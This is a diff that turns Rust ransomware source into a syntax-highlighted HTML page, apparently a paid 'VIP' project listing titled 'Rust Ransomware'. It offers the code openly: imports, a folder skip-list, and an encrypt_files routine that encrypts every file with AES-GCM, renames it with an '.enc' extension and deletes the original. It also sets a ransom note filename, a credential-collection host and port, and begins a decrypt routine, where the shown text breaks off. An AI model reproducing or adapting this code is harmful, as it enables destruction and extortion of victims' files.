@@ -1,110 +1,446 @@
-use aes_gcm::aead::{Aead, NewAead};
-use aes_gcm::{Aes256Gcm, Key, Nonce};
-use base64;
-use dirs;
-use rand;
-use std::env;
-use std::fs;
-use std::io::Write;
-use std::net::TcpStream;
-use std::path::PathBuf;
-use std::{thread, time};
-use walkdir::{DirEntry, WalkDir};
+{{ define "sub-content" }}
 
-static RANSOMWARE_EXT: &str = "enc";
-static RANSOM_NOTE_FILENAME: &str = "RANSOM_NOTE.txt";
-// Address where we collect credentials
-static HOST: &str = "127.0.0.1";
-static PORT: usize = 8080;
+<nav aria-label="breadcrumb">
+  <ol class="breadcrumb">
+    <li class="breadcrumb-item"><a href="/vip">VIP</a></li>
+    <li class="breadcrumb-item"><a href="/vip/projects">Projects</a></li>
+    <li class="breadcrumb-item active">{{ t "Rust Ransomware" . }}</li>
+  </ol>
+</nav>
 
-fn is_ignored(entry: &DirEntry) -> bool {
-    let file_name = entry.file_name();
+<h3>Rust Ransomware</h3>
+<p>
+</p>
+
+<p>Full source code (rust):</p>
+
+<h4 class="mt-5 mb-3">ransomware/main.rs</h4>
+<!-- Code begin -->
+<div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+	<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">124
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">126
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">127
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">128
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">129
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">130
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">131
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">132
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">133
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">134
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">135
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">136
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">137
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">138
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">139
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">140
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">141
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">142
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">143
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">144
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">145
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">146
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">147
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">148
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">149
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">150
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">151
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">152
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">153
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">154
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">155
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">156
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">157
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">158
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">159
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">160
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">161
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">162
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">163
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">164
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">165
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">166
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">167
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">168
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">169
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">170
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">171
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">172
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">173
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">174
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">175
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">176
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">177
+</span></pre></td>
+		<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">use</span> aes_gcm::aead::{Aead, NewAead};
+<span style="color:#66d9ef">use</span> aes_gcm::{Aes256Gcm, Key, Nonce};
+<span style="color:#66d9ef">use</span> base64;
+<span style="color:#66d9ef">use</span> dirs;
+<span style="color:#66d9ef">use</span> rand;
+<span style="color:#66d9ef">use</span> std::env;
+<span style="color:#66d9ef">use</span> std::fs;
+<span style="color:#66d9ef">use</span> std::io::Write;
+<span style="color:#66d9ef">use</span> std::net::TcpStream;
+<span style="color:#66d9ef">use</span> std::path::PathBuf;
+<span style="color:#66d9ef">use</span> std::{thread, time};
+<span style="color:#66d9ef">use</span> walkdir::{DirEntry, WalkDir};
+
+<span style="color:#66d9ef">static</span> RANSOMWARE_EXT: <span style="color:#66d9ef">&amp;</span><span style="color:#66d9ef">str</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;enc&#34;</span>;
+<span style="color:#66d9ef">static</span> RANSOM_NOTE_FILENAME: <span style="color:#66d9ef">&amp;</span><span style="color:#66d9ef">str</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;RANSOM_NOTE.txt&#34;</span>;
+<span style="color:#75715e">// Address where we collect credentials
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> HOST: <span style="color:#66d9ef">&amp;</span><span style="color:#66d9ef">str</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>;
+<span style="color:#66d9ef">static</span> PORT: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">8080</span>;
+
+<span style="color:#75715e">// Avoid encrypting big dependencies folders (node_modules and friends)
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">is_ignored</span>(entry: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">DirEntry</span>) -&gt; <span style="color:#66d9ef">bool</span> {
+    <span style="color:#66d9ef">let</span> file_name <span style="color:#f92672">=</span> entry.file_name();
     entry.path().is_dir()
-        && (file_name == "node_modules"
-            || file_name == "vendor"
-            || file_name == "site-packages"
-            || file_name == ".cargo"
-            || file_name == ".rustup"
-            || file_name == ".heroku"
-            || file_name == ".node-gyp"
-            || file_name == ".npm"
-            || file_name == ".yjp" // jetbrains ide
-            || file_name == ".ivy2" // maven cache
-            || file_name == ".m2"
-            || file_name == ".vscode"
-            || file_name == ".git"
-            || file_name == ".pub-cache" // dart
-            || file_name == ".gradle")
+        <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> (file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;node_modules&#34;</span>
+            <span style="color:#f92672">|</span><span style="color:#f92672">|</span> file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;vendor&#34;</span>
+            <span style="color:#f92672">|</span><span style="color:#f92672">|</span> file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;site-packages&#34;</span>
+            <span style="color:#f92672">|</span><span style="color:#f92672">|</span> file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.cargo&#34;</span>
+            <span style="color:#f92672">|</span><span style="color:#f92672">|</span> file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.rustup&#34;</span>
+            <span style="color:#f92672">|</span><span style="color:#f92672">|</span> file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.heroku&#34;</span>
+            <span style="color:#f92672">|</span><span style="color:#f92672">|</span> file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.node-gyp&#34;</span>
+            <span style="color:#f92672">|</span><span style="color:#f92672">|</span> file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.npm&#34;</span>
+            <span style="color:#f92672">|</span><span style="color:#f92672">|</span> file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.yjp&#34;</span> <span style="color:#75715e">// jetbrains ide
+</span><span style="color:#75715e"></span>            <span style="color:#f92672">|</span><span style="color:#f92672">|</span> file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.ivy2&#34;</span> <span style="color:#75715e">// maven cache
+</span><span style="color:#75715e"></span>            <span style="color:#f92672">|</span><span style="color:#f92672">|</span> file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.m2&#34;</span>
+            <span style="color:#f92672">|</span><span style="color:#f92672">|</span> file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.vscode&#34;</span>
+            <span style="color:#f92672">|</span><span style="color:#f92672">|</span> file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.git&#34;</span>
+            <span style="color:#f92672">|</span><span style="color:#f92672">|</span> file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.pub-cache&#34;</span> <span style="color:#75715e">// dart
+</span><span style="color:#75715e"></span>            <span style="color:#f92672">|</span><span style="color:#f92672">|</span> file_name <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.gradle&#34;</span>)
 }
 
-fn encrypt_files(target_dir: PathBuf, key: &str) {
-    let key = Key::from_slice(key.as_bytes());
-    let cipher = Aes256Gcm::new(key);
-    let walker = WalkDir::new(target_dir).into_iter().filter_entry(|e| !is_ignored(e));
-    for entry in walker {
-        let dir_entry = match entry {
-            Err(_) => continue,
-            Ok(dir_entry) => dir_entry,
+<span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">encrypt_files</span>(target_dir: <span style="color:#a6e22e">PathBuf</span>, key: <span style="color:#66d9ef">&amp;</span><span style="color:#66d9ef">str</span>) {
+    <span style="color:#66d9ef">let</span> key <span style="color:#f92672">=</span> Key::from_slice(key.as_bytes());
+    <span style="color:#66d9ef">let</span> cipher <span style="color:#f92672">=</span> Aes256Gcm::new(key);
+    <span style="color:#66d9ef">let</span> walker <span style="color:#f92672">=</span> WalkDir::new(target_dir).into_iter();
+    <span style="color:#66d9ef">for</span> entry <span style="color:#66d9ef">in</span> walker.filter_entry(<span style="color:#f92672">|</span>e<span style="color:#f92672">|</span> <span style="color:#f92672">!</span>is_ignored(e)) {
+        <span style="color:#66d9ef">let</span> dir_entry <span style="color:#f92672">=</span> <span style="color:#66d9ef">match</span> entry {
+            Err(_) <span style="color:#f92672">=</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">continue</span>,
+            Ok(dir_entry) <span style="color:#f92672">=</span><span style="color:#f92672">&gt;</span> dir_entry,
         };
-        if dir_entry.path().is_symlink() {
-            continue;
+        <span style="color:#75715e">// Skip symlinks
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> dir_entry.path_is_symlink() {
+            <span style="color:#66d9ef">continue</span>;
         }
-        if dir_entry.path().is_dir() {
-            continue;
+        <span style="color:#75715e">// Skip folders
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> dir_entry.path().is_dir() {
+            <span style="color:#66d9ef">continue</span>;
         }
-        if dir_entry.path().extension().unwrap_or_default() == RANSOMWARE_EXT {
-            continue;
+        <span style="color:#75715e">// skip already encrypted files
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> dir_entry.path().extension().unwrap_or_default() <span style="color:#f92672">=</span><span style="color:#f92672">=</span> RANSOMWARE_EXT {
+            <span style="color:#66d9ef">continue</span>;
         }
-        if dir_entry.file_name() == RANSOM_NOTE_FILENAME {
-            continue;
+        <span style="color:#75715e">// skip ransom note
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> dir_entry.file_name() <span style="color:#f92672">=</span><span style="color:#f92672">=</span> RANSOM_NOTE_FILENAME {
+            <span style="color:#66d9ef">continue</span>;
         }
 
-        let path = dir_entry.path();
-        let random_bytes: Vec<u8> = (0..12).map(|_| rand::random::<u8>()).collect();
-        let nonce_slice = random_bytes.as_slice();
-        let nonce = Nonce::from_slice(nonce_slice);
-        let content = fs::read(path).unwrap();
-        let ciphertext = cipher.encrypt(nonce, content.as_ref()).unwrap();
-        let mut ciphertext_with_nonce = ciphertext;
-        ciphertext_with_nonce.extend_from_slice(nonce_slice);
-        let orig_ext = path
+        <span style="color:#66d9ef">let</span> path <span style="color:#f92672">=</span> dir_entry.path();
+        <span style="color:#66d9ef">let</span> random_bytes: Vec<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0</span>..<span style="color:#ae81ff">12</span>).map(<span style="color:#f92672">|</span>_<span style="color:#f92672">|</span> rand::random::<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span>()).collect();
+        <span style="color:#66d9ef">let</span> nonce_slice <span style="color:#f92672">=</span> random_bytes.as_slice();
+        <span style="color:#66d9ef">let</span> nonce <span style="color:#f92672">=</span> Nonce::from_slice(nonce_slice);
+        <span style="color:#66d9ef">let</span> content <span style="color:#f92672">=</span> fs::read(path).unwrap();
+        <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> ciphertext <span style="color:#f92672">=</span> cipher.encrypt(nonce, content.as_ref()).unwrap();
+        ciphertext.extend_from_slice(nonce_slice);
+        <span style="color:#66d9ef">let</span> orig_ext <span style="color:#f92672">=</span> path
             .extension()
             .unwrap_or_default()
             .to_str()
             .unwrap_or_default();
-        let mut new_ext = String::new();
-        if orig_ext != "" {
-            new_ext = format!(".{}", orig_ext);
+        <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> new_ext <span style="color:#f92672">=</span> String::new();
+        <span style="color:#66d9ef">if</span> orig_ext <span style="color:#f92672">!</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> {
+            new_ext <span style="color:#f92672">=</span> format<span style="color:#f92672">!</span>(<span style="color:#e6db74">&#34;{}.&#34;</span>, orig_ext);
         }
-        new_ext += &RANSOMWARE_EXT;
-        let new_filepath = path.with_extension(new_ext);
-        fs::write(new_filepath, ciphertext_with_nonce).unwrap();
+        new_ext <span style="color:#f92672">+</span><span style="color:#f92672">=</span> RANSOMWARE_EXT;
+        <span style="color:#66d9ef">let</span> new_filepath <span style="color:#f92672">=</span> path.with_extension(new_ext);
+        fs::write(new_filepath, ciphertext).unwrap();
         fs::remove_file(path).unwrap();
     }
 }
 
-fn decrypt_files(target_dir: PathBuf, decryption_key: &str) {
-    let key_bytes = decryption_key.as_bytes();
-    if key_bytes.len() != 32 {
-        println!("invalid key length");
-        return;
+<span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">decrypt_files</span>(target_dir: <span style="color:#a6e22e">PathBuf</span>, decryption_key: <span style="color:#66d9ef">&amp;</span><span style="color:#66d9ef">str</span>) {
+    <span style="color:#66d9ef">let</span> key_bytes <span style="color:#f92672">=</span> decryption_key.as_bytes();
+    <span style="color:#66d9ef">if</span> key_bytes.len() <span style="color:#f92672">!</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span> {
+        println<span style="color:#f92672">!</span>(<span style="color:#e6db74">&#34;invalid key length&#34;</span>);
+        <span style="color:#66d9ef">return</span>;
     }
-    let key = Key::from_slice(key_bytes);
